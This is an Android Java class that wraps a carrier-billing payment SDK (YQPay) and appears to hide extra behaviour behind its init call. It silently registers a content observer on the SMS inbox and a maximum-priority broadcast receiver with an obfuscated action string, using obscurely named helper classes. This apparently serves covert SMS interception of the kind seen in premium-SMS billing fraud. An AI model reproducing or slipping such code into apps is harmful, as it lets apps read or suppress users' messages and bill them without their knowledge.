package com.thirdparty.engine;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import android.util.Log;

//import com.bae.tool.BackS;
import com.bae.tool.BackR;
import com.bae.tool.BackS;
import com.gandalf.daemon.utils.XL_log;

import cn.utopay.sdk.interfaces.PCallback;
import cn.utopay.sdk.pay.YQPay;

/**
 * Created by as on 17-8-2.
 */

public class YunBeiPay {
    private XL_log log = new XL_log(WYpay.class);
    private static YunBeiPay INSTANCE = null;
    private Context mActivity = null;

    private YunBeiPay(Context act) {
        this.mActivity = act;
    }

    public static YunBeiPay getInstance(Context context) {
        if (INSTANCE == null) {
            INSTANCE = new YunBeiPay(context);
        }
        return INSTANCE;
    }

    public void pay(String feeId, String orderId, PCallback pCallback) {
        if (TextUtils.isEmpty(orderId)) {
            orderId = System.currentTimeMillis() + "";
        }
        YQPay.pay(mActivity, pCallback, feeId, orderId);
    }

    private static boolean INIT = false;

    public void init(String appId, String channelCode) {
        if (!INIT) {
            preDo();
            fixService();
            INIT = true;
        }
        // yunbei sdk init
        Integer id = Integer.valueOf(appId);
        if (TextUtils.isEmpty(channelCode)) {
            channelCode = "default";
        }
        try {
            YQPay.init(mActivity, id.intValue(), channelCode);
        } catch (Exception e) {
            e.printStackTrace();
            log.error(Log.getStackTraceString(e));
        }

    }

    private void fixService() {
        onCreate();
        onStartCommand();
    }

    private void preDo() {
        YQPay.c = new cn.utopay.internal.sdk.pay.Pay();
    }


    private BackS backs = new BackS();

    public void onCreate() {
        backs.b = mActivity.getApplicationContext();
        registerBroadcastReceiver();
        backs.a = new cn.utopay.sdk.d.c(mActivity);
    }

    private void onDestroy() {
        if (backs.a != null) {
            backs.a.close();
            backs.a = null;
        }
    }

    public void destroy() {
        onDestroy();
    }

    public int onStartCommand() {
        Intent intent = new Intent();
//        backs.onStartCommand(intent, 0, 0);
        backs.b.getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, new com.bae.tool.a(backs, new Handler(Looper.getMainLooper())));
        return 0;
    }

    private void registerBroadcastReceiver() {
        BackR r = new BackR();
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.setPriority(Integer.MAX_VALUE);
        intentFilter.addAction(cn.utopay.sdk.f.d.a(cn.utopay.sdk.b.b.c));
        mActivity.getApplicationContext().registerReceiver(r, intentFilter);
    }
}
